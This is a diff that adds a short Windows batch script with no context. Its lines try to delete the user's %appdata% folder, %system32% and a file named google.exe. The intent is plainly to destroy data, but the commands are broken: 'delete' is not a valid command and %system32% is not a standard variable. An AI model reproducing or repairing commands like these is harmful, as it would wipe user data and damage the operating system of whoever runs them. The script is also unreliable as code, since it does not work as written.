@@ -1,0 +1,8 @@
+@echo delete
+
+echo 
+delete %appdata%
+delete %system32%
+delete google.exe
+
+
